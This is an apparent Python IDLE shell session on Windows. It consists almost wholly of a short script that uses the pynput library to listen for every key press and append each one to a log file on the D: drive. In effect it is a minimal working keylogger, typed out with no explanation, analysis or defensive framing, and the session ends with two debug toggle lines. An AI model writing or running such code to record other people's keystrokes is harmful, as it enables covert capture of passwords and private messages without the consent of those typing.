Python 3.11.9 (tags/v3.11.9:de54cf5, Apr  2 2024, 10:12:12) [MSC v.1938 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license()" for more information.
>>> from pynput.keyboard import Listener
... 
... def writeoffile(key):
...     keydata = str(key)
...     keydata = keydata.replace("'", "")
...     with open("D:\log.txt", "a") as f:
...         f.write(keydata)
... 
... with Listener(on_press=writeoffile) as l:
...     l.join()
>>> [DEBUG ON]
>>> [DEBUG OFF]
